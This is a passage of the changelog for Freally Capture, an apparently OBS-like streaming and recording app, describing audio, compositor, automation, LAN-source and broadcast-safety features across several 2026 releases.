# Changelog

All notable changes to Freally Capture will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project aims to adhere to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

> **Status: in development.** The studio MVP shipped at **0.70.0** (single-target streaming +
> Studio Mode); **0.85.0** adds the streaming depth — simultaneous multistream, SRT/WHIP,
> vertical/multi-canvas, the replay buffer, and the scene/source/filter/encoder depth. The
> release ladder below tracks the plan to 1.0.0.

## [Unreleased]

> **0.99.0 closes all 26 CAP-M must-haves.** 1.0.0 is gated on the *complete* feature set, so the
> remaining themed phases land first.

## [0.500.0] — 2026-07-15 (Audio Production Depth — Phase 4)

> *From mixer to console.* Phase 4 turns the shipped mixer into a broadcast console: physical
> output routing and aux/cue mixes, an N×M ducking matrix, a gain-sharing auto-mixer, EBU R128
> loudness normalization (live rider + post-record pass), a parametric EQ with a live spectrum, a
> de-esser and rumble guard, a soundboard, audio-only (podcast) recording, per-guest mix-minus with
> one-click voice-chain presets, and the discovery + MIT-clean foundation for CLAP **and VST3**
> plugin hosting. Everything is owned classic DSP — no ML, per the charter — and ships off/neutral
> by default, so an untouched mix is bit-identical to before.

### Added

- **Aux buses & physical output routing (CAP-N30)** — route the master mix or any of the six track
  buses to additional physical output devices, each with a trim, from a **Routing** matrix (the
  Audio Mixer's Routing button). A track bus sent to headphones is a cue mix that differs from the
  monitor. Defaults to today's exact behavior (only the monitor bus reaches a device).
- **Sidechain ducking matrix (CAP-N31)** — a consolidated **Ducking** grid of who ducks whom: any
  source can duck any set, each pair with its own depth, threshold, attack, and release. The engine
  stacks multiple duckers per strip, so one strip can be ducked by several triggers at once.
- **Gain-sharing auto-mixer (CAP-N32)** — a Dugan-style **Auto-mix** toggle per strip: across all
  auto-mixed mics the total gain is held ~constant and handed to whoever is speaking (a deterministic
  gain-sum-of-one law), ideal for multi-host panels and podcasts. Off by default.
- **EBU R128 loudness normalization (CAP-N34)** — a live **loudness rider** steers the program
  toward a target (−14 / −16 / −23 LUFS) with a peak ceiling, applied to the master and every track
  bus so recordings and streams land at a consistent level; plus a post-record **Normalize** action
  on the recordings list (ffmpeg `loudnorm`). Off by default.
- **Parametric EQ + spectrum view (CAP-N35)** — an N-band parametric EQ (bell / low-shelf /
  high-shelf / notch / high-pass / low-pass) with **draggable nodes over a live spectrum analyzer**;
  the curve is the same RBJ math the engine runs. Owned FFT; the analyzer arms per-strip only while
  the editor is open.
- **De-esser + rumble guard (CAP-N36)** — a split-band **de-esser** (a sibilance detector drives a
  dynamic high-shelf cut, phase-correct, no ML) and a clean 2nd-order low-cut **rumble guard** for
  desk thumps and plosives — both as regular audio filters.
- **Soundboard (CAP-N37)** — a pad grid of local audio clips with per-pad gain, choke groups
  (a new pad stops the last in its group), loop, hotkey, track assignment, and optional auto-duck
  of the rest of the mix while a pad plays. Pads decode through the labeled ffmpeg component into
  the mixer like any source.
- **Audio-only recording (CAP-N38)** — a **podcast mode** that records per-track **WAV** via the
  owned writer (no video encoder spun up at all), optionally transcoded to **FLAC/Opus** through the
  labeled ffmpeg component, with silent-skip markers written to a sidecar and CAP-M25 filename
  templates. From the recordings dialog.
- **Per-guest mix-minus & voice-chain presets (CAP-N39)** — one-click **voice-chain presets**
  (broadcast / podcast / clean gate→comp→EQ→limiter chains) applied to any strip, and an owned
  **mix-minus (N−1)** return per source (everyone in the program except that source) so a remote
  guest hears no echo.
- **Audio plugins — CLAP + VST3 discovery (CAP-N33)** — a **Plugins** panel that finds your
  installed **CLAP and VST3** plugins in the standard folders (opt-in, local-directory only, nothing
  fetched). Both formats are MIT-licensed, $0-clean; live hosting runs each plugin in a
  crash-isolated process with its own GUI — that host-process integration is in progress and the
  panel states the plan plainly rather than faking a toggle.
- **Live filter visualizers (plugin showpiece)** — every audio filter is now a visual instrument
  while its editor is open: a **transfer curve** for the dynamics (compressor / limiter / gate) with
  the live signal riding the curve, a **frequency-response curve** for the tone filters (EQ /
  de-esser / rumble guard), or a level readout for the rest — each beside **in / out / gain-reduction
  meters** that move with the audio, in the same sleek dark-analyzer look as the parametric EQ.
- **Desktop shortcut on Windows install** — the MSI now creates a **Freally Capture** desktop
  shortcut (removed on uninstall).

### Changed

- **VST3 is now MIT-licensed.** Steinberg relicensed the VST 3.8 SDK to MIT on **2025-10-29**, so
  the earlier "VST3 is GPLv3-or-proprietary, incompatible" note was corrected across `vst.rs`,
  `claphost.rs`, and `THIRD-PARTY-NOTICES.md` — VST3 is now a $0-clean plugin path on the same
  footing as CLAP.

## [0.400.0] — 2026-07-15 (Compositor & FX depth — Phase 3 complete)

> The second half of Phase 3 lands the five deferred motion-and-effects features, completing the
> phase: a **move (morph) transition**, **transition rules**, a **shader studio** for user WGSL
> effects, a **bezier mask** editor, and **track-matte stingers** with an optional program-audio
> duck. Plus a fix to two Help-menu links that did nothing.

### Added

- **Move (morph) transition (CAP-N20)** — a new transition kind: items that appear in *both* the
  outgoing and incoming scene (same source) animate from their old position/scale/rotation/crop to
  the new one instead of cutting; items in only one scene fade in or out. Eased with a
  smootherstep so the motion accelerates in and settles out.
- **Transition rules (CAP-N21)** — a per-scene-pair transition matrix (**Tools → Transition
  Rules**): scene A→B can use its own kind and duration instead of the default. Plus per-item
  **show/hide fade-in** (Edit Transform → Reveal): an item ramps in when it's made visible. All
  blend and move transitions are now eased.
- **Shader studio (CAP-N22)** — write a **user WGSL effect** as a filter: it's compiled and
  validated at runtime (an invalid shader is ignored — the source renders unfiltered, never a
  crash), with sliders auto-generated from `// @param` annotations, live editing, and a built-in
  gallery (grayscale, invert, scanlines, vignette).
- **Bezier mask (CAP-N28)** — a **freehand mask** filter: draw a closed path (drag the handles,
  double-click to add, right-click to remove), with preset shapes, per-edge feather, and invert.
  Export any path as a grayscale **luma-wipe** pattern for a shape-reveal transition.
- **Track-matte stingers (CAP-N29)** — a stinger can carry its transparency as a **track matte**
  (fill and matte packed **side-by-side** or **stacked**), so per-pixel alpha survives codecs that
  drop it (H.264/HEVC). Optionally **duck the program audio** under the stinger's own audio while
  it plays.

### Fixed

- **Help → Visit Website and Help Portal did nothing.** These menu links (and the same links in
  the About dialog) relied on the webview opening `target="_blank"`, which this Tauri build never
  does. They now open the OS browser through the app's vetted opener — **Visit Website** → the
  homepage, **Help Portal** → the documentation page.

## [0.310.0] — 2026-07-14 (Compositor & FX depth — Phase 3, part 1)

> The first half of Phase 3 (Compositor & FX Depth): motion-and-effects reach the canvas —
> new blur styles, a 3D tilt, a freeze-frame, one-click source clones, and broadcast-style
> **downstream keyers** that ride on top of every scene. Plus the three fixes reported against
> 0.301.0 — including a projector bug that could lock the whole desktop.

### Added

- **Blur family (CAP-N27)** — four new GPU filters beside the Gaussian blur: **directional**
  (motion streak along an angle), **radial** (spin about a center), **zoom** (dolly-zoom streak),
  and **pixelate** (mosaic). Each is a single planned pass with golden-frame tests.
- **3D / perspective transform (CAP-N23)** — an item can tilt in 3D: **Tilt X**, **Tilt Y**, and a
  **Perspective** strength in Edit Transform. A plain (untilted) transform renders pixel-identically
  — the projective matrix is used only when a tilt is applied.
- **Freeze-frame filter (CAP-N25)** — add a **Freeze** filter to a source and it holds its last
  frame; the program, preview, recording, and stream all freeze together. Toggle it to unfreeze.
- **Source clone (CAP-N26)** — a **Clone** button on every source row (⧉): one feed, many looks.
  The same source can sit in multiple scenes/spots, each item with its own transform and filter
  stack (the engine already keyed filters per item; this makes it one click).
- **Downstream keyers (CAP-N24)** — persistent overlay layers composited on the **program output**,
  above every scene, surviving scene cuts (a station logo, a LIVE badge, a lower-third). A new
  **Tools → Downstream Keyers** panel manages them: add any source, reorder, opacity, position/size,
  on/off per layer. They render into preview, recording, stream, and multiview alike.
- **What's New** now opens the running build's changelog **in-app** (the same read-only notes view
  the updater uses) instead of a browser tab — offline, always the notes that shipped.
- **Disk-space readout in the Stats dock** — a live **Disk** tile shows free space on the recording
  drive, and while recording a **Rec left** tile estimates the time until the drive is full at the
  current write rate (the same honest, `.frec`-aware estimate the low-disk warning uses). So you can
  see how much room is left as you record or stream.

### Fixed

- **Open Projector froze the whole desktop.** Opening a projector on a display asked the OS for
  exclusive fullscreen *during window creation* on the primary display, deadlocking the Windows
  event loop — the desktop locked up and the app had to be killed from Task Manager. Projectors are
  now a **borderless window sized to the chosen monitor** (what OBS's "fullscreen projector"
  actually is): no DWM mode switch, and Esc / Alt+F4 / the taskbar all keep working.
- **OBS scene import didn't pick the camera.** A Video Capture Device imported from OBS landed on
  "(current device)" with nothing selected — the importer dropped OBS's device entirely. It now
  carries OBS's friendly device name and resolves it to this machine's camera on import.

## [0.301.0] — 2026-07-14 (Menu bar & Settings modal)

> Desktop-app chrome, OBS-shaped but Freally's own: a real **menu bar** across the top and a
> **sidebar Settings modal** with OK / Cancel / Apply — so the Controls dock goes back to being
> live controls instead of a wall of launcher buttons.

### Added

- **Application menu bar** — File · Edit · View · Docks · Profile · Scene Collection · Tools · Help,
  across the top of the window. It is a pure dispatch layer over actions that already existed (the
  command palette's), so nothing new happens under the hood — the launchers just have a home now.
  File reaches Show Recordings / Remux / Settings / Show Settings Folder / Exit; Edit has
  undo-redo and copy/paste transform & filters; Tools gathers automation, rundown, hotkey map,
  A/V-sync, scripts, components, MIDI, PTZ, the remote API and the LAN panel; Profile and Scene
  Collection switch between saved sets; Help opens the docs, the changelog, a bug report, and the
  update check. Dropdowns are keyboard-navigable (arrow keys across and within menus) and
  screen-reader-labelled; items for features that don't exist yet are present but disabled.
- **OBS-style Settings modal** — a left sidebar of categories (**General · Appearance · Streaming ·
  Output · Replay · Hotkeys · Network · Accessibility · About**) with a grouped, scrollable pane and
  an **OK / Cancel / Apply** footer. **Nothing changes until you click Apply (or OK):** the modal
  edits a private copy, Apply is greyed out until you actually change something, and Cancel/Escape
  restores exactly what you had — theme and accent preview live while it's open but revert on cancel,
  leaving no trace. A per-category error surfaces inline with a dot on its sidebar entry.
- **Conflict-proof hotkey binding** — the Hotkeys category binds every action from a **dropdown of
  curated shortcuts**, not a text box. Picking a shortcut for one action removes it from every other
  action's menu, so two features can never hold the same key; **None** unbinds and returns it to the
  pool. A filter box narrows the list. Free-text entry is gone entirely, and the backend now rejects
  malformed accelerators structurally, so a nonsense binding can't be saved even by hand-editing.
- **Accessibility: mixer meter colours** — the new Accessibility category sets the VU-meter band
  colours, with a **colour-blind-safe preset** (Okabe-Ito) alongside Default and a Custom option.
- **Desktop shortcut folders** — File → Show Recordings / Show Settings Folder open the app's own
  folders in the file browser (an owned command, never a raw path from the webview).

### Changed

- **The Controls dock is now just controls.** All 18 dialog-launcher buttons (Settings, Output,
  Stream, Docks, Profiles, Scripts, Automation, Report-a-bug, Check-for-updates, …) moved into the
  menu bar; the dock keeps only what drives the broadcast — Start/Stop Recording, Go Live, Arm
  Replay, the panic button, Studio Mode, transitions. The crash-report and update-available prompts
  still surface on launch exactly as before.

## [0.300.1] — 2026-07-14 (The Phase 2 simplify pass)

> No new features: a four-angle cleanup review (reuse / simplification / efficiency / altitude)
> of the 0.300.0 changeset, applied. One visible fix rode along: the **input overlay's face
> compositor** still used the pre-fix alpha blend, so glyph edges drawn over transparency came
> out slightly dark — it now shares the corrected `compose::blit` with every other face source.

### Changed

- **Shared what 0.300.0 built and then bypassed.** The four hand-rolled alpha blits now call one
  compositor; the seek clamp, audio-sample decode, and child-process watchdog live once in
  `media.rs` (media, playlist, replay, and LAN ingest all adopt them); the four weak session
  registries are one `WeakRegistry`; the `{{variable}}` grammar is ONE function shared by titles
  and the automation engine (they can no longer drift); the LAN-ingest form, QR renderer,
  title-layer defaults, and option tables are single shared UI modules; the LAN IP probe, the
  Link sender's JPEG encoder, and the playlist's shuffle all call the helpers that already
  existed instead of carrying copies.
- **Real-time hygiene.** The mixer's visualizer tap no longer allocates per 10 ms block; the
  Freally Link sender writes frames header-then-payload instead of copying every JPEG program
  frame into an intermediate buffer; the split timer computes its comparison column once per
  session instead of per repaint; the LAN-ingest status check stopped re-stringing the source
  id on every drained frame.
- Assorted dead surface removed (an unread gamepad field, unused derives, over-public helpers)
  and ffmpeg argument prologues/probes deduplicated inside the decode module — byte-identical
  commands, stated once.

### Fixed

- **The Windows installer now creates a Desktop shortcut.** Tauri's NSIS template only makes a
  Start-Menu entry and offers no desktop-shortcut option, so no install ever put an icon on the
  Desktop — the installer hooks now create `Freally Capture.lnk` (the app's own icon) on every
  install and remove it on uninstall.
- **Alignment guides can now be cleared with one click.** Removing a guide meant dragging a
  1-pixel line off the canvas — precision work where a miss starts an item drag instead (whose
  magenta snap lines then read as "a new guide appeared", a live report). The guide toolbar
  gains a **Clear all guides** button, and the grab lane around each guide is wider.

## [0.300.0] — 2026-07-14 (New Sources & Overlays — CAP-N Phase 2)

> **Ten new things to put on the canvas — all local.** Instant replay rolls the buffer *into* the
> show, a gapless media playlist replaces the "one file at a time" media source, titles and
> scoreboards get a real layered designer with live control, and the canvas gains an audio
> visualizer, a performance HUD, a speedrun split timer, an input overlay, and cursor effects.
> Two LAN sources round it out: an SRT/RTMP listener so a phone or second PC can feed a scene, and
> **Freally Link**, an owned instance-to-instance share that needs no ffmpeg on either end.
>
> **The network invariant holds:** both LAN features are **off until you add them**, bind only the
> local machine, and never touch the internet. Nothing discovers, nothing dials out, and the app
> says so in every language. The input overlay and cursor effects read input **only while enabled**
> and never log or store a keystroke.

### Added

- **Instant-replay playback source** (CAP-N10). Roll the armed replay buffer straight into the
  program: a hotkey snapshots the last N seconds (stream copy — no re-encode) and plays them at
  100 / 50 / 25 %, **retimed, never frame-interpolated**. Scrub and pause while it plays; at the end
  the source clears back to transparent, so the show returns to live by itself. *Slow motion is
  silent by design — retimed audio would smear, and we don't fake it.*
- **LAN ingest source** (CAP-N11). A built-in **SRT/RTMP listener**: point any phone camera app,
  encoder, or second PC at the URL (shown with a QR code) and it lands in a scene with its own mixer
  strip. Off until added, binds the local machine only, never the internet. SRT carries an optional
  passphrase (AES); *RTMP has no authentication of its own — the form says so and prefers SRT.*
- **Freally Link** (CAP-N12). Two Freally instances on one LAN: enable the Link output on the
  sending machine and set its **pairing key** (the output cannot be enabled without one), hit
  **Scan the LAN** on the receiving one, type the key, and the program appears as a source —
  gaming PC to encoding PC, or an overflow-room monitor. A receiver that cannot present the key
  never sees a frame (constant-time compare, an honest "refused" error instead of a retry loop).
  An owned, hand-rolled wire protocol and mDNS discovery: **no ffmpeg needed on either end**, no
  broker, no server.
- **Input overlay source** (CAP-N13). Live keyboard, mouse, and gamepad visualization with four
  layouts (WASD, compact keyboard, dual-stick pad, 8-way fight stick) — pressed keys light up,
  clicks flash, sticks and triggers move. **Reads input only while the source is enabled, and never
  logs or stores anything.** Keyboard/mouse are Windows-first (said honestly in-product); gamepads
  work on all three OSes.
- **System-stats overlay source** (CAP-N14). The stats dock's *real measured numbers* — fps, CPU,
  memory, GPU compose time, dropped frames, and live bitrate — composited for your viewers, with
  per-line toggles. *GPU utilization is deliberately absent: we don't measure it, so we don't guess.*
- **Audio visualizer source** (CAP-N15). Classic FFT spectrum bars, an oscilloscope, or stereo VU
  meters, bound to any mixer strip, track bus, or the master mix. Tapped **post-fader** — a muted
  source visualizes flat, exactly as it sounds. Owned radix-2 FFT; no ML anywhere.
- **Title & scoreboard designer** (CAP-N16). Layered templates (text, image, shape) with outline and
  drop-shadow text, animate-in/out (fade, slide, wipe), fields bound to a watched file (CSV cell,
  JSON pointer) or a studio variable, and live control — swap a name, edit the score, fire the
  animation — without touching the scene.
- **Media playlist source** (CAP-N17). An ordered playlist that plays **truly gaplessly** (the whole
  trimmed list runs through one decode, so item boundaries are frame-exact), with per-item in/out
  trims and cue points, loop / shuffle / hold-last, next-previous hotkeys, and a "now playing"
  variable any Text source can show.
- **Speedrun split timer source** (CAP-N18). Import a LiveSplit `.lss` file and run it: comparisons
  against personal best, best segments, or average, gold-segment highlights, and global split / undo
  / skip / reset hotkeys. The file is read **only** — a run is never written back. *Process-memory
  auto-splitters are deliberately not supported (anti-cheat adjacency); splitting is by file and
  hotkey.*
- **Cursor highlight & click effects** (CAP-N19). A cursor halo, colour-coded left/right click
  ripples, and optional keystroke ghosting drawn onto display and window captures — tutorial-maker
  table stakes, on the owned cursor path. Windows-only, honestly (macOS and Linux composite their own
  cursor); keystrokes are drawn, never logged.

### Fixed

- **Sharp-bilinear scaling was blurrier than plain bilinear** (regression in 0.200.0's CAP-N70).
  The shader measured texel *edges* rather than centres, so most of every texel landed on the 50/50
  border blend. It now holds each texel's centre and crosses to its neighbour inside a narrow seam,
  which is what the mode is for. The new per-scaler golden-frame tests (owed since 0.200.0) pin it.

### Packaging note

- **The Windows MSI carries ProductVersion `0.230.0` internally.** Windows Installer caps the MSI
  minor version at 255, which the 0.300.0 rung exceeds — the first release where the "+100 per
  phase" scheme meets that limit. The mapping is `MSI minor = 200 + app-minor ÷ 10`
  (0.400.0 → `0.240.0` … 0.900.0 → `0.290.0`, then 1.0.0 → `1.0.0`), strictly increasing so MSI
  upgrades keep replacing older installs. Only the MSI's internal version differs: the app, the
  NSIS installer, the updater, and About all say **0.300.0**.

## [0.200.0] — 2026-07-13 (Automation + Capture & Device Depth — CAP-N Phases 1 & 9)

> Two themed phases in one release, so the version crosses two rungs (0.99.0 → 0.200.0). **Phase 1
> — Automation** makes the studio drive itself: a rules engine, macros with variables, MIDI and OSC
> control surfaces, hotkey chords and layers, a LAN touch panel, a tally-light service, PTZ camera
> control, and a timed show rundown. **Phase 9 — Capture & Device Depth** finishes the glass-to-canvas
> path: a low-latency passthrough monitor, pixel-perfect scaling, punch-in zoom, auto black-bar crop,
> window↔app-audio auto-linking, and HDR→SDR tone-mapping. Ships alongside the **scene backdrop** and
> **true reverse media playback** built earlier in the cycle.
>
> **The whole automation surface shares one design invariant:** every rule, macro, MIDI pad, OSC
> address, panel button, and rundown step dispatches through a single fixed command allowlist — the
> same one the WebSocket remote API exposes. No control surface can name a file, spawn a process, or
> reach the internet **by construction**, and every network surface is off by default and binds
> loopback unless LAN is explicitly enabled.

### Added

- **Scene backdrop / wallpaper.** Pin any image, looping GIF, or looping video behind the capture as
  a full-canvas or half-screen (left / right / top / bottom) backdrop, with the capture auto-seated
  in the other half. Mouse-wheel zoom on the capture or the backdrop, a real-time Flip filter, a
  "hold until recording starts" mode with a pre-record preview, and a hide/show toggle so a tutorial
  video can play full-frame before the capture returns.
- **True reverse media playback + full transport.** A real reverse render (bounded-memory, segmented,
  cached) plus scrub, seek-from-anywhere, play/pause, and a loop toggle — a backdrop video behaves
  like a regular player, on the operator's cue.
- **Automation rules engine** (CAP-N01). Nine edge-triggered triggers — scene switch, stream state,
  recording state, source error, audio level crossing, system idle, window focus, time of day, and a
  watched file changing — gated by conditions (a variable equals, streaming, recording) that run
  studio actions. Every rule ships **disabled**; the engine is a no-op until one is turned on.
- **Macros, variables & sequences** (CAP-N02). Named step sequences (run an action, wait, set a
  variable) with a repeat count and an optional global hotkey, runnable from the UI, a hotkey, a rule,
  or the remote API. Studio **variables** interpolate `{{name}}` into any Text source and update it
  live the moment a macro sets the value.
- **MIDI control surfaces** (CAP-N03). MIDI-learn a pad, knob, or fader onto a studio action, macro,
  scene switch, mixer fader, or mute, with **LED and motor-fader feedback** that mirrors the studio's
  real state (the REC pad lights because you are recording). No MIDI port opens until one is chosen.
- **OSC control** (CAP-N04). TouchOSC-class controllers and lighting desks drive the studio over Open
  Sound Control — `/scene/switch`, `/record/start`, `/macro/run`, `/mixer/vol`, and more. Off by
  default, loopback unless LAN. *OSC has no authentication of its own — the LAN toggle says so.*
- **Hotkey chords & layers** (CAP-N05). Two-stroke chords (`Ctrl+K, 3`) where the bare second key is
  only claimed while the chord is pending, plus sticky layers so a small keyboard drives many actions.
- **LAN touch panel** (CAP-N06). The app serves a control page — scene buttons with live tally, mixer
  faders, and action keys — to any phone on the network, reached by a QR code. Off by default, a
  password on every request, loopback unless LAN, and the page is embedded (nothing is fetched from
  the internet).
- **Tally light service** (CAP-N07). A full-screen red/green tally page any spare phone can display;
  `?scene=NAME` watches one scene, otherwise it tracks the program's live state.
- **PTZ camera control** (CAP-N08). Pan / tilt / zoom cameras over VISCA-over-IP with named presets
  and per-scene auto-recall (a scene going on program recalls its bound shot). LAN-only; a camera
  exists only because its address was entered — nothing is discovered.
- **Show rundown** (CAP-N09). An ordered playlist of steps — a scene and how long it holds, plus
  optional actions — with manual or automatic advance and a live "next up + remaining time". Running
  a rundown switches scenes the ordinary, undoable way; it never edits the scene collection.
- **Low-latency passthrough monitor** (CAP-N69). A projector that shows a capture device's **raw**
  frames — no scenes, no filters, no compositor — with a measured capture→display latency readout, so
  a capture-card game feed can be watched with minimal delay.
- **Pixel-perfect scaling modes** (CAP-N70). Per-item smooth, nearest-neighbor, integer-snapped, or
  sharp-bilinear scaling — retro/pixel-art content reaches the canvas without blur.
- **Punch-in zoom & follow pan** (CAP-N71). Wheel-zoom into any capture with a critically-damped
  animation, three hotkey presets, and an optional follow mode that tracks the cursor.
- **Auto black-bar crop** (CAP-N72). Detect and crop letterbox/pillarbox bars from a source, one-shot
  or continuously as the content's aspect changes.
- **Window↔app-audio auto-link** (CAP-N73). Capture a window's application audio alongside it; hiding
  the window mutes the linked strip and showing it unmutes — without ever clobbering a manual mute.
- **HDR→SDR tone-map for capture** (CAP-N74). Map an HDR display's output to the SDR canvas
  (clip / hue-preserving maxRGB / Reinhard / BT.2408 knee) with an adjustable paper-white level, tuned
  live per display without restarting the capture.

### Security & reliability

- Every automation surface routes through the shared remote-API allowlist (`ALLOWED_COMMANDS`), so no
  rule, macro, MIDI/OSC binding, panel button, or rundown step can reach a command the app's own
  buttons don't — verified by a test that the allowlist and its dispatch arms cannot drift apart.
- The `FileChanged` trigger honors the existing remote-path guard, so watching a file never probes a
  UNC path (no NTLM credential leak).
- Both LAN control surfaces (panel, OSC) warn in Settings that LAN traffic is unencrypted before the
  port opens to the network.

## [0.99.0] — 2026-07-12 (Sources, devices & calibration — CAP-M Batch 3)

> The third and final must-have batch: everything between the glass and the canvas. Built-in
> test signals and a guided A/V sync workbench to calibrate the whole chain; timer/clock and
> file-bound text sources for shows that run on data; a hotkey map that audits every binding;
> the missing mixer console features; and real device depth — deinterlacing and cross-platform
> camera controls with per-device profiles.

### Added
- **Test signal sources** (CAP-M21). SMPTE-style color bars, a calibration grid/crosshatch, a
  motion sweep, the 1 kHz lineup tone (−20 dBFS), and a combined **A/V sync flash+beep**
  pattern generated from one clock — verify scenes, encoders, projectors, and stream targets
  with no camera plugged in.
- **An A/V sync calibration workbench** (CAP-M20). A guided tool that plays the flash+beep
  pattern through your display and speakers, watches your camera and microphone capture it
  back, measures the offset by pure signal processing (onset detection over several cycles,
  with honest failure guidance — dark room, silent mic, room noise that isn't the pattern),
  and offers to apply the result to the microphone's sync offset. The manual slider stays as
  the fallback. Loopback honesty: your display/speaker latency is part of what's measured.
- **Timer & clock sources** (CAP-M15). A text-source family: wall clock (strftime formats +
  fixed UTC offset), countdown (to a duration or the next wall time, with an at-zero action —
  flash the face or switch scene), count-up stopwatch, and time since live / since recording.
  Start/pause/reset from the source's properties or two new global hotkeys (all timers at
  once). Faces repaint only when their text changes.
- **Text from file + data binding** (CAP-M16). A Text source can bind to a watched local
  file: the whole `.txt`, one CSV cell (header name or index), or one JSON value (RFC 6901
  pointer) — re-read within half a second of a change, tolerating atomic-write (temp+rename)
  editors by keeping the last good value on screen. The scoreboard/lower-third foundation,
  no service required. The OBS importer now maps "read from file" too.
- **A hotkey map** (CAP-M14). One searchable, filterable table of **every** binding — global
  actions and per-source push-to-talk/push-to-mute — with honest conflict signals: the same
  chord written two ways is flagged as shared, and a key the OS refused to register (owned by
  another app, or unavailable on this compositor) says so. Exports a Markdown cheat sheet to
  Downloads. Settings → Hotkeys binds; this audits and documents.
- **Mixer completeness: pan, solo, mono** (CAP-M19). Per-strip stereo **balance** (center is
  bit-identical to no pan), **PFL solo** (the monitor hears only soloed strips — the program
  mix never changes), and per-source **mono downmix**.
- **Deinterlacing for device sources** (CAP-M17). Per-device discard / bob / linear / blend /
  motion-adaptive (yadif-class) with field-order selection — pure CPU on the capture thread,
  identical on every OS. Changing the mode restarts the device, like a format change.
- **Camera controls with per-device profiles** (CAP-M18). Exposure, white balance, focus,
  zoom, gain (and more) for webcams and capture cards through one cross-platform path — UVC
  via the native APIs on Windows/Linux; macOS surfaces whatever AVFoundation reports, which
  is often nothing, and the panel says so honestly. Every adjustment saves into a per-device
  profile that reapplies on hotplug and restart.

## [0.98.0] — 2026-07-12 (Broadcast safety & reliability — CAP-M Batch 2)

> The second must-have batch: *don't lose the show*. The studio now catches failures before you go
> live (a pre-flight checklist), while you're live (always-on safety alarms, a mid-session encoder
> failover, a source health dashboard), and after the worst happens (crash-safe recordings with a
> next-launch repair, a quit guard that finalizes everything in order). And when you need to hide
> everything *right now*, there's a panic button.

### Added
- **Recording filename templates** (CAP-M25). Token-based naming — `{prefix}`, `{date}`, `{time}`,
  `{scene}`, `{profile}`, `{canvas}`, `{marker-count}`, and a persisted `{counter}` — for recordings,
  replay saves and stills, with collision-safe auto-suffixing and **per-output folders** for replays
  and stills. Names are sanitized against every platform's reserved characters; a template typo is
  caught at save time.
- **A source health dashboard** (CAP-M13). One palette-opened panel with every source's live state,
  fps, **last-frame age**, dropped-frame count and restart history — plus per-source Restart and
  Properties. Sources the engine isn't running honestly read "inactive".
- **A quit guard + orderly shutdown** (CAP-M23). Closing the studio while live, recording, or
  replay-armed asks first — listing exactly what will happen — then ends the stream, finalizes the
  recording, and flushes the replay buffer **in order** before exiting. A crash-marker file now
  distinguishes clean exits from crashes.
- **Crash-safe recordings + a salvage prompt** (CAP-M11). mp4/mov recordings are written
  **fragmented** (an index flush per keyframe), so a crash or power cut leaves a playable file
  instead of an unreadable one. If a session dies uncleanly mid-recording, the next launch offers a
  one-click **repair** into a `(repaired)` copy — the original is never touched.
- **Mid-session encoder failover** (CAP-M12). If the hardware encoder faults mid-stream or
  mid-recording (driver reset, GPU contention), the session hot-swaps down a ladder — the other
  hardware family, then x264 — instead of dying. The stream rides its existing reconnect; the
  recording continues in a new file; an honest toast + a sticky stats-dock note say exactly what
  happened. Network faults never trigger a swap.
- **Broadcast safety alarms** (CAP-M10). Always-on watchdogs while output runs: **silent program
  audio**, **sustained clipping**, a **black or frozen program picture** (classic CV — sampled luma
  + frame delta over the existing readback, no ML), and a **low-disk forecast** ("~22 min left at
  the current bitrate"). Non-modal: a dismissible banner + the screen-reader announcer.
- **A panic button** (CAP-M22). One global hotkey cuts program (and the vertical canvas, and any
  projectors) to a configurable privacy slate, stops every capture, and hard-mutes all audio — the
  microphone isn't even being captured — while the stream and recording stay up. Restoring is a
  deliberate two-step confirm.
- **A redacted diagnostics bundle** (CAP-M24). "Export diagnostics" writes a zip (config snapshot,
  encoder/device probe, recent stats, the last crash report) built by a strict **allowlist** —
  stream keys, passwords, tokens, file paths and user text are never read, let alone included. You
  can read the exact content before exporting; nothing is ever sent anywhere.
- **A go-live pre-flight checklist** (CAP-M09). Go Live now runs the checks first: targets keyed,
  encoder usable, sources healthy, disk space sufficient — each green/red with a one-click fix —
  plus honest nudges for mic/desktop-audio metering and the replay buffer. An optional setting
  holds Go Live until every blocking check is green.

### Changed
- mp4/mov recordings switched from write-index-at-the-end (`+faststart`) to fragmented writing;
  the salvage repair (or Remux) produces a classic faststart file when an editor insists on one.
- The `HotkeySettings` validator now bounds the still-grab and panic accelerators too.

## [0.97.0] — 2026-07-11 (Scene authoring & monitoring — CAP-M Batch 1)

> The first of the three must-have batches on the road to 1.0.0. The compositor learns to be *edited*
> like a studio, not just driven: an undo history behind every scene edit, a multi-select with
> align-and-distribute and pull-out guides, precise transforms you can copy between items, and a
> keying workbench that shows you the matte. And it learns to be *watched*: a multiview of every
> scene, fullscreen projectors for any scene / source / program / preview on any display, and a
> one-key lossless still grab. Finally, it opens up to the world it came from — importing an OBS
> scene collection, and finding the media that moved.

### Added
- **Multi-step undo/redo for every scene edit** (CAP-M01). A bounded, labelled snapshot history rides
  under the same lock as the collection; a continuous gesture (a drag, a fader ride) folds into one
  step; `Ctrl`/`Cmd`+`Z` reverses edits — never the live show (selecting the program scene, center
  view, and focus stay off the stack). A viewable history list shows exactly what each step will undo.
- **An OBS scene-collection importer** (CAP-M02). Point it at an OBS `scenes.json` and it maps the
  scenes, z-order, per-item visibility/lock/blend, colour/text/image/media sources, display/window/
  camera/audio captures, nested scenes, and the video **and** audio filters it recognizes — then hands
  back an **honest per-source report**: what came across clean, what needs its capture device re-picked,
  what references a file to check, and what had no equivalent and was skipped. Item sizes and positions
  are fitted from OBS's layout (a scene file carries neither native source sizes nor the canvas), so the
  report says so.
- **A missing-file doctor** (CAP-M03). On load — or on demand from the palette — it scans the collection
  for image / media / font / LUT / mask paths that no longer resolve and offers to relink each. Fixing
  one broken path repairs every scene that used it; "Locate in folder…" bulk-matches by name.
- **Alignment gets a full multi-select** (CAP-M04). Shift-click and a rubber-band marquee select many
  items; drag any of them to move the group (snapped as one box); align their edges/centers to each
  other or distribute them evenly. And you can pull out your own **guide lines** — drag to move, drag
  off-canvas to delete — that dragged items snap to, drawn over both the JPEG and the native GPU preview.
- **A precision transform panel with copy/paste** (CAP-M05). Type an item's anchor-relative position,
  size, rotation and crop; copy a transform or a whole filter chain and paste it onto another item as a
  single undo step.
- **A keying workbench** (CAP-M26). Tune a chroma/colour/luma key against a live single-source view with
  a matte mode (alpha → grey), an eyedropper, a loupe, and a draggable before/after split.
- **A multiview monitor** (CAP-M06) — a live grid of every scene with red (program) / green (preview)
  tally, click to cut or (in Studio Mode) stage. It can open as its own window on any display.
- **Projectors for anything, anywhere** (CAP-M07) — fullscreen the program, the Studio-Mode preview, a
